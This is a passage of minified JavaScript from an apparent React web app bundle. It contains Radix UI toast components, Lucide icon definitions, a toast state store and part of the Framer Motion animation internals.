Date().getTime()-J.current;H.current=H.current-ue,window.clearTimeout(ee.current),g==null||g()};return K.addEventListener(Ul,ae),K.addEventListener(Hl,ge),()=>{K.removeEventListener(Ul,ae),K.removeEventListener(Hl,ge)}}},[A.viewport,$,g,f,ne]),I.useEffect(()=>{p&&!A.isClosePausedRef.current&&ne($)},[p,$,A.isClosePausedRef,ne]),I.useEffect(()=>(le(),()=>ve()),[le,ve]);const be=I.useMemo(()=>P?If(P):null,[P]);return A.viewport?x.jsxs(x.Fragment,{children:[be&&x.jsx(Ub,{__scopeToast:o,role:"status","aria-live":a==="foreground"?"assertive":"polite","aria-atomic":!0,children:be}),x.jsx(zb,{scope:o,onClose:Ae,children:cc.createPortal(x.jsx(pc.ItemSlot,{scope:o,children:x.jsx(wb,{asChild:!0,onEscapeKeyDown:mt(h,()=>{A.isFocusedToastEscapeKeyDownRef.current||Ae(),A.isFocusedToastEscapeKeyDownRef.current=!1}),children:x.jsx(Wt.li,{role:"status","aria-live":"off","aria-atomic":!0,tabIndex:0,"data-state":p?"open":"closed","data-swipe-direction":A.swipeDirection,...M,ref:L,style:{userSelect:"none",touchAction:"none",...n.style},onKeyDown:mt(n.onKeyDown,K=>{K.key==="Escape"&&(h==null||h(K.nativeEvent),K.nativeEvent.defaultPrevented||(A.isFocusedToastEscapeKeyDownRef.current=!0,Ae()))}),onPointerDown:mt(n.onPointerDown,K=>{K.button===0&&(N.current={x:K.clientX,y:K.clientY})}),onPointerMove:mt(n.onPointerMove,K=>{if(!N.current)return;const ge=K.clientX-N.current.x,ae=K.clientY-N.current.y,ue=!!B.current,W=["left","right"].includes(A.swipeDirection),q=["left","up"].includes(A.swipeDirection)?Math.min:Math.max,U=W?q(0,ge):0,S=W?0:q(0,ae),j=K.pointerType==="touch"?10:2,Z={x:U,y:S},ce={originalEvent:K,delta:Z};ue?(B.current=Z,Qo(Fb,v,ce,{discrete:!1})):Gp(Z,A.swipeDirection,j)?(B.current=Z,Qo(Bb,y,ce,{discrete:!1}),K.target.setPointerCapture(K.pointerId)):(Math.abs(ge)>j||Math.abs(ae)>j)&&(N.current=null)}),onPointerUp:mt(n.onPointerUp,K=>{const ge=B.current,ae=K.target;if(ae.hasPointerCapture(K.pointerId)&&ae.releasePointerCapture(K.pointerId),B.current=null,N.current=null,ge){const ue=K.currentTarget,W={originalEvent:K,delta:ge};Gp(ge,A.swipeDirection,A.swipeThreshold)?Qo(Ob,T,W,{discrete:!0}):Qo(Vb,w,W,{discrete:!0}),ue.addEventListener("click",q=>q.preventDefault(),{once:!0})}})})})}),A.viewport)})]}):null}),Ub=n=>{const{__scopeToast:r,children:o,...a}=n,c=ms(Ri,r),[p,d]=I.useState(!1),[h,g]=I.useState(!1);return $b(()=>d(!0)),I.useEffect(()=>{const f=window.setTimeout(()=>g(!0),1e3);return()=>window.clearTimeout(f)},[]),h?null:x.jsx(gf,{asChild:!0,children:x.jsx(uc,{...a,children:p&&x.jsxs(x.Fragment,{children:[c.label," ",o]})})})},Hb="ToastTitle",Sf=I.forwardRef((n,r)=>{const{__scopeToast:o,...a}=n;return x.jsx(Wt.div,{...a,ref:r})});Sf.displayName=Hb;var Gb="ToastDescription",Tf=I.forwardRef((n,r)=>{const{__scopeToast:o,...a}=n;return x.jsx(Wt.div,{...a,ref:r})});Tf.displayName=Gb;var Cf="ToastAction",Af=I.forwardRef((n,r)=>{const{altText:o,...a}=n;return o.trim()?x.jsx(Ef,{altText:o,asChild:!0,children:x.jsx(hc,{...a,ref:r})}):(console.error(`Invalid prop \`altText\` supplied to \`${Cf}\`. Expected non-empty \`string\`.`),null)});Af.displayName=Cf;var Pf="ToastClose",hc=I.forwardRef((n,r)=>{const{__scopeToast:o,...a}=n,c=_b(Pf,o);return x.jsx(Ef,{asChild:!0,children:x.jsx(Wt.button,{type:"button",...a,ref:r,onClick:mt(n.onClick,c.onClose)})})});hc.displayName=Pf;var Ef=I.forwardRef((n,r)=>{const{__scopeToast:o,altText:a,...c}=n;return x.jsx(Wt.div,{"data-radix-toast-announce-exclude":"","data-radix-toast-announce-alt":a||void 0,...c,ref:r})});function If(n){const r=[];return Array.from(n.childNodes).forEach(a=>{if(a.nodeType===a.TEXT_NODE&&a.textContent&&r.push(a.textContent),Kb(a)){const c=a.ariaHidden||a.hidden||a.style.display==="none",p=a.dataset.radixToastAnnounceExclude==="";if(!c)if(p){const d=a.dataset.radixToastAnnounceAlt;d&&r.push(d)}else r.push(...If(a))}}),r}function Qo(n,r,o,{discrete:a}){const c=o.originalEvent.currentTarget,p=new CustomEvent(n,{bubbles:!0,cancelable:!0,detail:o});r&&c.addEventListener(n,r,{once:!0}),a?uf(c,p):c.dispatchEvent(p)}var Gp=(n,r,o=0)=>{const a=Math.abs(n.x),c=Math.abs(n.y),p=a>c;return r==="left"||r==="right"?p&&a>o:!p&&c>o};function $b(n=()=>{}){const r=Qn(n);Ei(()=>{let o=0,a=0;return o=window.requestAnimationFrame(()=>a=window.requestAnimationFrame(r)),()=>{window.cancelAnimationFrame(o),window.cancelAnimationFrame(a)}},[r])}function Kb(n){return n.nodeType===n.ELEMENT_NODE}function qb(n){const r=[],o=document.createTreeWalker(n,NodeFilter.SHOW_ELEMENT,{acceptNode:a=>{const c=a.tagName==="INPUT"&&a.type==="hidden";return a.disabled||a.hidden||c?NodeFilter.FILTER_SKIP:a.tabIndex>=0?NodeFilter.FILTER_ACCEPT:NodeFilter.FILTER_SKIP}});for(;o.nextNode();)r.push(o.currentNode);return r}function Sl(n){const r=document.activeElement;return n.some(o=>o===r?!0:(o.focus(),document.activeElement!==r))}var Yb=vf,Df=wf,Mf=xf,Rf=Sf,Nf=Tf,Lf=Af,jf=hc;const $p=n=>typeof n=="boolean"?`${n}`:n===0?"0":n,Kp=ac,Bf=(n,r)=>o=>{var a;if((r==null?void 0:r.variants)==null)return Kp(n,o==null?void 0:o.class,o==null?void 0:o.className);const{variants:c,defaultVariants:p}=r,d=Object.keys(c).map(f=>{const y=o==null?void 0:o[f],v=p==null?void 0:p[f];if(y===null)return null;const w=$p(y)||$p(v);return c[f][w]}),h=o&&Object.entries(o).reduce((f,y)=>{let[v,w]=y;return w===void 0||(f[v]=w),f},{}),g=r==null||(a=r.compoundVariants)===null||a===void 0?void 0:a.reduce((f,y)=>{let{class:v,className:w,...T}=y;return Object.entries(T).every(M=>{let[A,P]=M;return Array.isArray(P)?P.includes({...p,...h}[A]):{...p,...h}[A]===P})?[...f,v,w]:f},[]);return Kp(n,d,g,o==null?void 0:o.class,o==null?void 0:o.className)};var Qb={xmlns:"http://www.w3.org/2000/svg",width:24,height:24,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:2,strokeLinecap:"round",strokeLinejoin:"round"};const Xb=n=>n.replace(/([a-z0-9])([A-Z])/g,"$1-$2").toLowerCase(),Ye=(n,r)=>{const o=I.forwardRef(({color:a="currentColor",size:c=24,strokeWidth:p=2,absoluteStrokeWidth:d,children:h,...g},f)=>I.createElement("svg",{ref:f,...Qb,width:c,height:c,stroke:a,strokeWidth:d?Number(p)*24/Number(c):p,className:`lucide lucide-${Xb(n)}`,...g},[...r.map(([y,v])=>I.createElement(y,v)),...(Array.isArray(h)?h:[h])||[]]));return o.displayName=`${n}`,o},Zb=Ye("AlertTriangle",[["path",{d:"m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z",key:"c3ski4"}],["path",{d:"M12 9v4",key:"juzpu7"}],["path",{d:"M12 17h.01",key:"p32p05"}]]),Ff=Ye("Archive",[["rect",{width:"20",height:"5",x:"2",y:"3",rx:"1",key:"1wp1u1"}],["path",{d:"M4 8v11a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8",key:"1s80jp"}],["path",{d:"M10 12h4",key:"a56b0p"}]]),Jb=Ye("ArrowLeft",[["path",{d:"m12 19-7-7 7-7",key:"1l729n"}],["path",{d:"M19 12H5",key:"x3x0zl"}]]),Vf=Ye("ArrowRight",[["path",{d:"M5 12h14",key:"1ays0h"}],["path",{d:"m12 5 7 7-7 7",key:"xquz4c"}]]),Of=Ye("CalendarDays",[["rect",{width:"18",height:"18",x:"3",y:"4",rx:"2",ry:"2",key:"eu3xkr"}],["line",{x1:"16",x2:"16",y1:"2",y2:"6",key:"m3sa8f"}],["line",{x1:"8",x2:"8",y1:"2",y2:"6",key:"18kwsl"}],["line",{x1:"3",x2:"21",y1:"10",y2:"10",key:"xt86sb"}],["path",{d:"M8 14h.01",key:"6423bh"}],["path",{d:"M12 14h.01",key:"1etili"}],["path",{d:"M16 14h.01",key:"1gbofw"}],["path",{d:"M8 18h.01",key:"lrp35t"}],["path",{d:"M12 18h.01",key:"mhygvu"}],["path",{d:"M16 18h.01",key:"kzsmim"}]]),ew=Ye("ChevronLeft",[["path",{d:"m15 18-6-6 6-6",key:"1wnfg3"}]]),tw=Ye("ChevronRight",[["path",{d:"m9 18 6-6-6-6",key:"mthhwq"}]]),nw=Ye("Github",[["path",{d:"M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5.08-1.25-.27-2.48-1-3.5.28-1.15.28-2.35 0-3.5 0 0-1 0-3 1.5-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.403 5.403 0 0 0 4 9c0 3.5 3 5.5 6 5.5-.39.49-.68 1.05-.85 1.65-.17.6-.22 1.23-.15 1.85v4",key:"tonef"}],["path",{d:"M9 18c-4.51 2-5-2-7-2",key:"9comsn"}]]),rw=Ye("Home",[["path",{d:"m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z",key:"y5dka4"}],["polyline",{points:"9 22 9 12 15 12 15 22",key:"e2us08"}]]),iw=Ye("Linkedin",[["path",{d:"M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z",key:"c2jq9f"}],["rect",{width:"4",height:"12",x:"2",y:"9",key:"mk3on5"}],["circle",{cx:"4",cy:"4",r:"2",key:"bt5ra8"}]]),ow=Ye("Rss",[["path",{d:"M4 11a9 9 0 0 1 9 9",key:"pv89mb"}],["path",{d:"M4 4a16 16 0 0 1 16 16",key:"k0647b"}],["circle",{cx:"5",cy:"19",r:"1",key:"bfqh0e"}]]),zf=Ye("Search",[["circle",{cx:"11",cy:"11",r:"8",key:"4ej97u"}],["path",{d:"m21 21-4.3-4.3",key:"1qie3q"}]]),sw=Ye("Tag",[["path",{d:"M12 2H2v10l9.29 9.29c.94.94 2.48.94 3.42 0l6.58-6.58c.94-.94.94-2.48 0-3.42L12 2Z",key:"14b2ls"}],["path",{d:"M7 7h.01",key:"7u93v4"}]]),aw=Ye("Twitter",[["path",{d:"M22 4s-.7 2.1-2 3.4c1.6 10-9.4 17.3-18 11.6 2.2.1 4.4-.6 6-2C3 15.5.5 9.6 3 5c2.2 2.6 5.6 4.1 9 4-.9-4.2 4-6.6 7-3.8 1.1 0 3-1.2 3-1.2z",key:"pff0z6"}]]),_f=Ye("UserCircle",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["circle",{cx:"12",cy:"10",r:"3",key:"ilqhr7"}],["path",{d:"M7 20.662V19a2 2 0 0 1 2-2h6a2 2 0 0 1 2 2v1.662",key:"154egf"}]]),ss=Ye("XCircle",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"m15 9-6 6",key:"1uzhvr"}],["path",{d:"m9 9 6 6",key:"z0biqf"}]]),lw=Ye("X",[["path",{d:"M18 6 6 18",key:"1bl5f8"}],["path",{d:"m6 6 12 12",key:"d8bk6v"}]]),cw=Yb,Wf=Te.forwardRef(({className:n,...r},o)=>x.jsx(Df,{ref:o,className:vt("fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]",n),...r}));Wf.displayName=Df.displayName;const uw=Bf("data-[swipe=move]:transition-none group relative pointer-events-auto flex w-full items-center justify-between space-x-4 overflow-hidden rounded-md border p-6 pr-8 shadow-lg transition-all data-[swipe=move]:translate-x-[var(--radix-toast-swipe-move-x)] data-[swipe=cancel]:translate-x-0 data-[swipe=end]:translate-x-[var(--radix-toast-swipe-end-x)] data-[state=open]:animate-in data-[state=closed]:animate-out data-[swipe=end]:animate-out data-[state=closed]:fade-out-80 data-[state=open]:slide-in-from-top-full data-[state=open]:sm:slide-in-from-bottom-full data-[state=closed]:slide-out-to-right-full",{variants:{variant:{default:"bg-background border",destructive:"group destructive border-destructive bg-destructive text-destructive-foreground"}},defaultVariants:{variant:"default"}}),Uf=Te.forwardRef(({className:n,variant:r,...o},a)=>x.jsx(Mf,{ref:a,className:vt(uw({variant:r}),n),...o}));Uf.displayName=Mf.displayName;const dw=Te.forwardRef(({className:n,...r},o)=>x.jsx(Lf,{ref:o,className:vt("inline-flex h-8 shrink-0 items-center justify-center rounded-md border bg-transparent px-3 text-sm font-medium ring-offset-background transition-colors hover:bg-secondary focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 group-[.destructive]:border-destructive/30 group-[.destructive]:hover:border-destructive/30 group-[.destructive]:hover:bg-destructive group-[.destructive]:hover:text-destructive-foreground group-[.destructive]:focus:ring-destructive",n),...r}));dw.displayName=Lf.displayName;const Hf=Te.forwardRef(({className:n,...r},o)=>x.jsx(jf,{ref:o,className:vt("absolute right-2 top-2 rounded-md p-1 text-foreground/50 opacity-0 transition-opacity hover:text-foreground focus:opacity-100 focus:outline-none focus:ring-2 group-hover:opacity-100 group-[.destructive]:text-red-300 group-[.destructive]:hover:text-red-50 group-[.destructive]:focus:ring-red-400 group-[.destructive]:focus:ring-offset-red-600",n),"toast-close":"",...r,children:x.jsx(lw,{className:"h-4 w-4"})}));Hf.displayName=jf.displayName;const Gf=Te.forwardRef(({className:n,...r},o)=>x.jsx(Rf,{ref:o,className:vt("text-sm font-semibold",n),...r}));Gf.displayName=Rf.displayName;const $f=Te.forwardRef(({className:n,...r},o)=>x.jsx(Nf,{ref:o,className:vt("text-sm opacity-90",n),...r}));$f.displayName=Nf.displayName;const pw=1,hw=1e6,Xt={ADD_TOAST:"ADD_TOAST",UPDATE_TOAST:"UPDATE_TOAST",DISMISS_TOAST:"DISMISS_TOAST",REMOVE_TOAST:"REMOVE_TOAST"};let Tl=0;function fw(){return Tl=(Tl+1)%Number.MAX_VALUE,Tl.toString()}const Cl=new Map,qp=n=>{if(Cl.has(n))return;const r=setTimeout(()=>{Cl.delete(n),Si({type:Xt.REMOVE_TOAST,toastId:n})},hw);Cl.set(n,r)},gw=(n,r)=>{switch(r.type){case Xt.ADD_TOAST:return{...n,toasts:[r.toast,...n.toasts].slice(0,pw)};case Xt.UPDATE_TOAST:return{...n,toasts:n.toasts.map(o=>o.id===r.toast.id?{...o,...r.toast}:o)};case Xt.DISMISS_TOAST:{const{toastId:o}=r;return o?qp(o):n.toasts.forEach(a=>{qp(a.id)}),{...n,toasts:n.toasts.map(a=>a.id===o||o===void 0?{...a,open:!1}:a)}}case Xt.REMOVE_TOAST:return r.toastId===void 0?{...n,toasts:[]}:{...n,toasts:n.toasts.filter(o=>o.id!==r.toastId)}}},ts=[];let ns={toasts:[]};function Si(n){ns=gw(ns,n),ts.forEach(r=>{r(ns)})}function mw(n){const r=fw(),o=c=>Si({type:Xt.UPDATE_TOAST,toast:{...c,id:r}}),a=()=>Si({type:Xt.DISMISS_TOAST,toastId:r});return Si({type:Xt.ADD_TOAST,toast:{...n,id:r,open:!0,onOpenChange:c=>{c||a()}}}),{id:r,dismiss:a,update:o}}function yw(){const[n,r]=Te.useState(ns);return Te.useEffect(()=>(ts.push(r),()=>{const o=ts.indexOf(r);o>-1&&ts.splice(o,1)}),[n]),{...n,toast:mw,dismiss:o=>Si({type:Xt.DISMISS_TOAST,toastId:o})}}function vw(){const{toasts:n}=yw();return x.jsxs(cw,{children:[n.map(({id:r,title:o,description:a,action:c,...p})=>x.jsxs(Uf,{...p,children:[x.jsxs("div",{className:"grid gap-1",children:[o&&x.jsx(Gf,{children:o}),a&&x.jsx($f,{children:a})]}),c,x.jsx(Hf,{})]},r)),x.jsx(Wf,{})]})}const Kf=I.createContext({transformPagePoint:n=>n,isStatic:!1,reducedMotion:"never"}),ys=I.createContext({}),fc=I.createContext(null),vs=typeof document<"u",bw=vs?I.useLayoutEffect:I.useEffect,qf=I.createContext({strict:!1}),gc=n=>n.replace(/([a-z])([A-Z])/g,"$1-$2").toLowerCase(),ww="framerAppearId",Yf="data-"+gc(ww);function kw(n,r,o,a){const{visualElement:c}=I.useContext(ys),p=I.useContext(qf),d=I.useContext(fc),h=I.useContext(Kf).reducedMotion,g=I.useRef();a=a||p.renderer,!g.current&&a&&(g.current=a(n,{visualState:r,parent:c,props:o,presenceContext:d,blockInitialAnimation:d?d.initial===!1:!1,reducedMotionConfig:h}));const f=g.current;I.useInsertionEffect(()=>{f&&f.update(o,d)});const y=I.useRef(!!(o[Yf]&&!window.HandoffComplete));return bw(()=>{f&&(f.render(),y.current&&f.animationState&&f.animationState.animateChanges())}),I.useEffect(()=>{f&&(f.updateFeatures(),!y.current&&f.animationState&&f.animationState.animateChanges(),y.current&&(y.current=!1,window.HandoffComplete=!0))}),f}function Ar(n){return n&&typeof n=="object"&&Object.prototype.hasOwnProperty.call(n,"current")}function xw(n,r,o){return I.useCallback(a=>{a&&n.mount&&n.mount(a),r&&(a?r.mount(a):r.unmount()),o&&(typeof o=="function"?o(a):Ar(o)&&(o.current=a))},[r])}function Ii(n){return typeof n=="string"||Array.isArray(n)}function bs(n){return n!==null&&typeof n=="object"&&typeof n.start=="function"}const mc=["animate","whileInView","whileFocus","whileHover","whileTap","whileDrag","exit"],yc=["initial",...mc];function ws(n){return bs(n.animate)||yc.some(r=>Ii(n[r]))}function Qf(n){return!!(ws(n)||n.variants)}function Sw(n,r){if(ws(n)){const{initial:o,animate:a}=n;return{initial:o===!1||Ii(o)?o:void 0,animate:Ii(a)?a:void 0}}return n.inherit!==!1?r:{}}function Tw(n){const{initial:r,animate:o}=Sw(n,I.useContext(ys));return I.useMemo(()=>({initial:r,animate:o}),[Yp(r),Yp(o)])}function Yp(n){return Array.isArray(n)?n.join(" "):n}const Qp={animation:["animate","variants","whileHover","whileTap","exit","whileInView","whileFocus","whileDrag"],exit:["exit"],drag:["drag","dragControls"],focus:["whileFocus"],hover:["whileHover","onHoverStart","onHoverEnd"],tap:["whileTap","onTap","onTapStart","onTapCancel"],pan:["onPan","onPanStart","onPanSessionStart","onPanEnd"],inView:["whileInView","onViewportEnter","onViewportLeave"],layout:["layout","layoutId"]},Di={};for(const n in Qp)Di[n]={isEnabled:r=>Qp[n].some(o=>!!r[o])};function Cw(n){for(const r in n)Di[r]={...Di[r],...n[r]}}const Xf=I.createContext({}),Zf=I.createContext({}),Aw=Symbol.for("motionComponentSymbol");function Pw({preloadedFeatures:n,createVisualElement:r,useRender:o,useVisualState:a,Component:c}){n&&Cw(n);function p(h,g){let f;const y={...I.useContext(Kf),...h,layoutId:Ew(h)},{isStatic:v}=y,w=Tw(h),T=a(h,v);if(!v&&vs){w.visualElement=kw(c,T,y,r);const M=I.useContext(Zf),A=I.useContext(qf).strict;w.visualElement&&(f=w.visualElement.loadFeatures(y,A,n,M))}return I.createElement(ys.Provider,{value:w},f&&w.visualElement?I.createElement(f,{visualElement:w.visualElement,...y}):null,o(c,h,xw(T,w.visualElement,g),T,v,w.visualElement))}const d=I.forwardRef(p);return d[Aw]=c,d}function Ew({layoutId:n}){const r=I.useContext(Xf).id;return r&&n!==void 0?r+"-"+n:n}function Iw(n){function r(a,c={}){return Pw(n(a,c))}if(typeof Proxy>"u")return r;const o=new Map;return new Proxy(r,{get:(a,c)=>(o.has(c)||o.set(c,r(c)),o.get(c))})}const Dw=["animate","circle","defs","desc","ellipse","g","image","line","filter","marker","mask","metadata","path","pattern","polygon","polyline","rect","stop","switch","symbol","svg","text","tspan","use","view"];function vc(n){return typeof n!="string"||n.includes("-")?!1:!!(Dw.indexOf(n)>-1||/[A-Z]/.test(n))}const as={};function Mw(n){Object.assign(as,n)}const Ni=["transformPerspective","x","y","z","translateX","translateY","translateZ","scale","scaleX","scaleY","rotate","rotateX","rotateY","rotateZ","skew","skewX","skewY"],Jn=new Set(Ni);function Jf(n,{layout:r,layoutId:o}){return Jn.has(n)||n.startsWith("origin")||(r||o!==void 0)&&(!!as[n]||n==="opacity")}const dt=n=>!!(n&&n.getVelocity),Rw={x:"translateX",y:"translateY",z:"translateZ",transformPerspective:"perspective"},Nw=Ni.length;function Lw(n,{enableHardwareAcceleration:r=!0,allowTransformNone:o=!0},a,c){let p="";for(let d=0;d<Nw;d++){const h=Ni[d];if(n[h]!==void 0){const g=Rw[h]||h;p+=`${g}(${n[h]}) `}}return r&&!n.z&&(p+="translateZ(0)"),p=p.trim(),c?p=c(n,a?"":p):o&&a&&(p="none"),p}const eg=n=>r=>typeof r=="string"&&r.startsWith(n),tg=eg("--"),$l=eg("var(--"),jw=/var\s*\(\s*--[\w-]+(\s*,\s*(?:(?:[^)(]|\((?:[^)(]+|\([^)(]*\))*\))*)+)?\s*\)/g,Bw=(n,r)=>r&&typeof n=="number"?r.transform(n):n,Pn=(n,r,o)=>Math.min(Math.max(o,n),r),er={test:n=>typeof n=="number",parse:parseFloat,transform:n=>n},Ti={...er,transform:n=>Pn(0,1,n)},Xo={...er,default:1},Ci=n=>Math.round(n*1e5)/1e5,ks=/(-)?([\d]*\.?[\d])+/g,ng=/(#[0-9a-f]{3,8}|(rgb|hsl)a?\((-?[\d\.]+%?[,\s]+){2}(-?[\d\.]+%?)\s*[\,\/]?\s*[\d\.]*%?\))/gi,Fw=/^(#[0-9a-f]{3,8}|(rgb|hsl)a?\((-?[\d\.]+%?[,\s]+){2}(-?[\d\.]+%?)\s*[\,\/]?\s*[\d\.]*%?\))$/i;function Li(n){return typeof n=="string"}const ji=n=>({test:r=>Li(r)&&r.endsWith(n)&&r.split(" ").length===1,parse:parseFloat,transform:r=>`${r}${n}`}),Sn=ji("deg"),_t=ji("%"),oe=ji("px"),Vw=ji("vh"),Ow=ji("vw"),Xp={..._t,parse:n=>_t.parse(n)/100,transform:n=>_t.transform(n*100)},Zp={...er,transform:Math.round},rg={borderWidth:oe,borderTopWidth:oe,borderRightWidth:oe,borderBottomWidth:oe,borderLeftWidth:oe,borderRadius:oe,radius:oe,borderTopLeftRadius:oe,borderTopRightRadius:oe,borderBottomRightRadius:oe,borderBottomLeftRadius:oe,width:oe,maxWidth:oe,height:oe,maxHeight:oe,size:oe,top:oe,right:oe,bottom:oe,left:oe,padding:oe,paddingTop:oe,paddingRight:oe,paddingBottom:oe,paddingLeft:oe,margin:oe,marginTop:oe,marginRight:oe,marginBottom:oe,marginLeft:oe,rotate:Sn,rotateX:Sn,rotateY:Sn,rotateZ:Sn,scale:Xo,scaleX:Xo,scaleY:Xo,scaleZ:Xo,skew:Sn,skewX:Sn,skewY:Sn,distance:oe,translateX:oe,translateY:oe,translateZ:oe,x:oe,y:oe,z:oe,perspective:oe,transformPerspective:oe,opacity:Ti,originX:Xp,originY:Xp,originZ:oe,zIndex:Zp,fillOpacity:Ti,strokeOpacity:Ti,numOctaves:Zp};function bc(n,r,o,a){const{style:c,vars:p,transform:d,transformOrigin:h}=n;let g=!1,f=!1,y=!0;for(const v in r){const w=r[v];if(tg(v)){p[v]=w;continue}const T=rg[v],M=Bw(w,T);if(Jn.has(v)){if(g=!0,d[v]=M,!y)continue;w!==(T.default||0)&&(y=!1)}else v.startsWith("origin")?(f=!0,h[v]=M):c[v]=M}if(r.transform||(g||a?c.transform=Lw(n.transform,o,y,a):c.transform&&(c.transform="none")),f){const{originX:v="50%",originY:w="50%",originZ:T=0}=h;c.transformOrigin=`${v} ${w} ${T}`}}const wc=()=>({style:{},transform:{},transformOrigin:{},vars:{}});function ig(n,r,o){for(const a in r)!dt(r[a])&&!Jf(a,o)&&(n[a]=r[a])}function zw({transformTemplate:n},r,o){return I.useMemo(()=>{const a=wc();return bc(a,r,{enableHardwareAcceleration:!o},n),Object.assign({},a.vars,a.style)},[r])}function _w(n,r,o){const a=n.style||{},c={};return ig(c,a,n),Object.assign(c,zw(n,r,o)),n.transformValues?n.transformValues(c):c}function Ww(n,r,o){const a={},c=_w(n,r,o);return n.drag&&n.dragListener!==!1&&(a.draggable=!1,c.userSelect=c.WebkitUserSelect=c.WebkitTouchCallout="none",c.touchAction=n.drag===!0?"none":`pan-${n.drag==="x"?"y":"x"}`),n.tabIndex===void 0&&(n.onTap||n.onTapStart||n.whileTap)&&(a.tabIndex=0),a.style=c,a}const Uw=new Set(["animate","exit","variants","initial","style","values","variants","transition","transformTemplate","transformValues","custom","inherit","onBeforeLayoutMeasure","onAnimationStart","onAnimationComplete","onUpdate","onDragStart","onDrag","onDragEnd","onMeasureDragConstraints","onDirectionLock","onDragTransitionEnd","_dragX","_dragY","onHoverStart","onHoverEnd","onViewportEnter","onViewportLeave","globalTapTarget","ignoreStrict","viewport"]);function ls(n){return n.startsWith("while")||n.startsWith("drag")&&n!=="draggable"||n.startsWith("layout")||n.startsWith("onTap")||n.startsWith("onPan")||n.startsWith("onLayout")||Uw.has(n)}let og=n=>!ls(n);function Hw(n){n&&(og=r=>r.startsWith("on")?!ls(r):n(r))}try{Hw(require("@emotion/is-prop-valid").default)}catch{}function Gw(n,r,o){const a={};for(const c in n)c==="values"&&typeof n.values=="object"||(og(c)||o===!0&&ls(c)||!r&&!ls(c)||n.draggable&&c.startsWith("onDrag"))&&(a[c]=n[c]);return a}function Jp(n,r,o){return typeof n=="string"?n:oe.transform(r+o*n)}function $w(n,r,o){const a=Jp(r,n.x,n.width),c=Jp(o,n.y,n.height);return`${a} ${c}`}const Kw={offset:"stroke-dashoffset",array:"stroke-dasharray"},qw={offset:"strokeDashoffset",array:"strokeDasharray"};function Yw(n,r,o=1,a=0,c=!0){n.pathLength=1;const p=c?Kw:qw;n[p.offset]=oe.transform(-a);const d=oe.transform(r),h=oe.transform(o);n[p.array]=`${d} ${h}`}function kc(n,{attrX:r,attrY:o,attrScale:a,originX:c,originY:p,pathLength:d,pathSpacing:h=1,pathOffset:g=0,...f},y,v,w){if(bc(n,f,y,w),v){n.style.viewBox&&(n.attrs.viewBox=n.style.viewBox);return}n.attrs=n.style,n.style={};const{attrs:T,style:M,dimensions:A}=n;T.transform&&(A&&(M.transform=T.transform),delete T.transform),A&&(c!==void 0||p!==void 0||M.transform)&&(M.transformOrigin=$w(A,c!==void 0?c:.5,p!==void 0?p:.5)),r!==void 0&&(T.x=r),o!==void 0&&(T.y=o),a!==void 0&&(T.scale=a),d!==void 0&&Yw(T,d,h,g,!1)}const sg=()=>({...wc(),attrs:{}}),xc=n=>typeof n=="string"&&n.toLowerCase()==="svg";function Qw(n,r,o,a){const c=I.useMemo(()=>{const p=sg();return kc(p,r,{enableHardwareAcceleration:!1},xc(a),n.transformTemplate),{...p.attrs,style:{...p.style}}},[r]);if(n.style){const p={};ig(p,n.style,n),c.style={...p,...c.style}}return c}function Xw(n=!1){return(o,a,c,{latestValues:p},d)=>{const g=(vc(o)?Qw:Ww)(a,p,d,o),y={...Gw(a,typeof o=="string",n),...g,ref:c},{children:v}=a,w=I.useMemo(()=>dt(v)?v.get():v,[v]);return I.createElement(o,{...y,children:w})}}function ag(n,{style:r,vars:o},a,c){Object.assign(n.style,r,c&&c.getProjectionStyles(a));for(const p in o)n.style.setProperty(p,o[p])}const lg=new Set(["baseFrequency","diffuseConstant","kernelMatrix","kernelUnitLength","keySplines","keyTimes","limitingConeAngle","markerHeight","markerWidth","numOctaves","targetX","targetY","surfaceScale","specularConstant","specularExponent","stdDeviation","tableValues","viewBox","gradientTransform","pathLength","startOffset","textLength","lengthAdjust"]);function cg(n,r,o,a){ag(n,r,void 0,a);for(const c in r.attrs)n.setAttribute(lg.has(c)?c:gc(c),r.attrs[c])}function Sc(n,r){const{style:o}=n,a={};for(const c in o)(dt(o[c])||r.style&&dt(r.style[c])||Jf(c,n))&&(a[c]=o[c]);return a}function ug(n,r){const o=Sc(n,r);for(const a in n)if(dt(n[a])||dt(r[a])){const c=Ni.indexOf(a)!==-1?"attr"+a.charAt(0).toUpperCase()+a.substring(1):a;o[c]=n[a]}return o}function Tc(n,r,o,a={},c={}){return typeof r=="function"&&(r=r(o!==void 0?o:n.custom,a,c)),typeof r=="string"&&(r=n.variants&&n.variants[r]),typeof r=="function"&&(r=r(o!==void 0?o:n.custom,a,c)),r}function Zw(n){const r=I.useRef(null);return r.current===null&&(r.current=n()),r.current}const cs=n=>Array.isArray(n),Jw=n=>!!(n&&typeof n=="object"&&n.mix&&n.toValue),e0=n=>cs(n)?n[n.length-1]||0:n;function rs(n){const r=dt(n)?n.get():n;return Jw(r)?r.toValue():r}function t0({scrapeMotionValuesFromProps:n,createRenderState:r,onMount:o},a,c,p){const d={latestValues:n0(a,c,p,n),renderState:r()};return o&&(d.mount=h=>o(a,h,d)),d}const dg=n=>(r,o)=>{const a=I.useContext(ys),c=I.useContext(fc),p=()=>t0(n,r,a,c);return o?p():Zw(p)};function n0(n,r,o,a){const c={},p=a(n,{});for(const w in p)c[w]=rs(p[w]);let{initial:d,animate:h}=n;const g=ws(n),f=Qf(n);r&&f&&!g&&n.inherit!==!1&&(d===void 0&&(d=r.initial),h===void 0&&(h=r.animate));let y=o?o.initial===!1:!1;y=y||d===!1;const v=y?h:d;return v&&typeof v!="boolean"&&!bs(v)&&(Array.isArray(v)?v:[v]).forEach(T=>{const 